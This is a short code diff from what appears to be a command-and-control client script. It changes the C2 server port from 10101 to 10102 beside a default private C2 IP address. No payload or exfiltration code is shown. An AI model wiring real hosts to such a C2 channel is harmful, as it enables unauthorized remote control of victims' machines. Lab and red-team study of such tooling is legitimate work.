@@ -30,7 +30,7 @@ def main():
         C2_ip = argv[1]
     else:
         C2_ip = "10.0.0.196"  # C2 server IP
-    C2_port = 10101 # C2 server port (mismatch due to port-fowarding)
+    C2_port = 10102 # C2 server port (mismatch due to port-fowarding)
     C2_addr = (C2_ip, C2_port)
     
     ip = ""
